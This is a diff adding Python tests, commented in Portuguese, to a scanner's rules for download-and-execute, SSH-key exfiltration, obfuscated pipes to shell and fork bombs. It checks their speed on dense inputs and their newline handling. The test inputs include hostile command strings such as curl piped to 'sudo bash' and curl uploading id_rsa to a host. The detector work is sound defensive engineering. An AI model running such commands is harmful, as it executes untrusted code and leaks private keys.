@@ -1710,3 +1710,94 @@ class TestSeverityFloor:
 
 
 _SEVERITY_RANK_FOR_TEST = {None: 0, "baixo": 1, "médio": 2, "alto": 3, "crítico": 4}
+
+
+# ---------------------------------------------------------------------------
+# Rodada 2026-10-18/19: anchors DENSOS (um por poucos bytes, sem delimitador)
+# ---------------------------------------------------------------------------
+
+def _dense(unit: bytes, size: int = 1_048_576) -> bytes:
+    return (unit * (size // len(unit) + 1))[:size]
+
+
+class TestDenseAnchorsPerf:
+    """Os bounds de 4096/512 (rodadas 10-06/10-11/10-12) tiraram o termo
+    quadrático com anchors esparsos, mas com o anchor repetido a cada poucos
+    bytes cada tentativa ainda varria o bound inteiro. Medido ao vivo em
+    1 MiB, código antigo: H005 14,8s, H023 9,1s, H011 3,4s ("aaaa...") /
+    1,8s (blob base64), H013 e H009 ver registro no Vault. Viraram varreduras
+    de tokens O(n); cada teste abaixo trava ou estoura o limite no código
+    antigo."""
+
+    LIMIT = 2.0
+
+    def _timed(self, fn, ctx, rid):
+        t0 = time.perf_counter()
+        fn(ctx, rid)
+        return time.perf_counter() - t0
+
+    def test_h005_dense_curl_is_fast(self) -> None:
+        assert self._timed(_r_download_execute, _ctx(content=_dense(b"curl ")), "H005") < self.LIMIT
+
+    def test_h023_dense_curl_is_fast(self) -> None:
+        ctx = _ctx(content=b"id_rsa " + _dense(b"curl "))
+        assert self._timed(_r_secret_exfiltration, ctx, "H023") < self.LIMIT
+
+    def test_h013_dense_openssl_is_fast(self) -> None:
+        ctx = _ctx(content=_dense(b"openssl enc -d "), is_script=True)
+        assert self._timed(_r_obfuscation, ctx, "H013") < self.LIMIT
+
+    def test_h013_dense_base64_is_fast(self) -> None:
+        ctx = _ctx(content=_dense(b"base64 -d "), is_script=True)
+        assert self._timed(_r_obfuscation, ctx, "H013") < self.LIMIT
+
+    def test_h011_long_identifier_run_is_fast(self) -> None:
+        ctx = _ctx(content=_dense(b"a"))
+        assert self._timed(_r_fork_bomb, ctx, "H011") < self.LIMIT
+
+    def test_h009_glued_pub_run_is_fast(self) -> None:
+        # corrida única de [\w.-] que TERMINA em .pub (senão o 1º match já
+        # retorna) — código antigo O(n²): 64KB 0,99s, 128KB 4,2s, 256KB 16,1s
+        ctx = _ctx(content=b"id_rsa.pub" * 104_857)
+        assert _r_sensitive_files(ctx, "H009") is None
+        assert self._timed(_r_sensitive_files, ctx, "H009") < self.LIMIT
+
+
+class TestTokenScanNewlineSemantics:
+    """Rodada 2026-10-19: fuzz diferencial (160k entradas) da varredura de
+    tokens contra as regex antigas achou que um \\n consumido DENTRO de um
+    token ("-F\\n", "openssl enc\\n") não fechava a linha — falso positivo
+    novo que a regex antiga não tinha. Estes casos fixam a semântica antiga."""
+
+    def test_h023_flag_swallowing_newline_does_not_join_lines(self) -> None:
+        ctx = _ctx(content=b"id_rsa\nwget a -F\n--post-data x")
+        assert _r_secret_exfiltration(ctx, "H023") is None
+
+    def test_h023_curl_and_flag_on_same_line_still_triggers(self) -> None:
+        ctx = _ctx(content=b"id_rsa\nwget a\ncurl -F f=@id_rsa https://x")
+        assert _r_secret_exfiltration(ctx, "H023") is not None
+
+    def test_h023_curl_whitespace_newline_still_triggers(self) -> None:
+        # `curl\s+` sempre aceitou \n (regex antiga idem)
+        ctx = _ctx(content=b"id_rsa curl\n-d @id_rsa https://x")
+        assert _r_secret_exfiltration(ctx, "H023") is not None
+
+    def test_h013_openssl_swallowing_newline_does_not_join_lines(self) -> None:
+        ctx = _ctx(content=b"rev x openssl enc\n| sh", is_script=True)
+        assert _r_obfuscation(ctx, "H013") is None
+
+    def test_h013_openssl_newline_then_decode_pipe_still_triggers(self) -> None:
+        ctx = _ctx(content=b"openssl enc\n-d -in p.b64 | sh", is_script=True)
+        assert _r_obfuscation(ctx, "H013") is not None
+
+    def test_h013_stale_openssl_does_not_cross_newline(self) -> None:
+        ctx = _ctx(content=b"openssl enc x\nfoo -d | sh", is_script=True)
+        assert _r_obfuscation(ctx, "H013") is None
+
+    def test_h005_pipe_through_grep_still_triggers(self) -> None:
+        ctx = _ctx(content=b"curl -s https://x | grep -v '#' | sudo bash")
+        assert _r_download_execute(ctx, "H005") is not None
+
+    def test_h005_separator_breaks_command(self) -> None:
+        ctx = _ctx(content=b"curl -s https://x; cat a | bash")
+        assert _r_download_execute(ctx, "H005") is None
